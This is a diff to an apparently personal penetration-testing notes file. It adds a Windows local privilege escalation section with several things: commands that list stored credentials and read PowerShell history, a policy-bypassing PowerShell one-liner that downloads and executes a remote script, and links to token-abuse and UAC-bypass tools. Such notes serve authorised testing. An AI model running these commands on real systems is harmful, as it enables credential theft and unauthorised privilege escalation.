@@ -104,9 +104,31 @@ A collection of smart screen test links.
 * Smart Screen Untrusted: https://demo.smartscreen.msft.net/download/malwaredemo/freevideo.exe  
 * Smart Screen Exploit: https://demo.smartscreen.msft.net/other/exploit.html
 
-## Ideas
+## Ideas for LPE
 
-`powershell -ep bypass -c "Invoke-Expression -Command (Invoke-RestMethod 'https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT"`
+```powershell
+net accounts
+cmdkey /list
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
+`
+
+```powershell
+powershell -ep bypass -c "Invoke-Expression -Command (Invoke-RestMethod 'https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT"
+```
+
+WSL
+```
+C:\Windows\System32\bash.exe
+C:\Windows\System32\wsl.exe
+```
+
+https://github.com/antonioCoco/RunasCs
+https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1
+https://github.com/BeichenDream/GodPotato
+https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe
+
+https://github.com/BlackShell256/Invoke-UAC
 
 
 
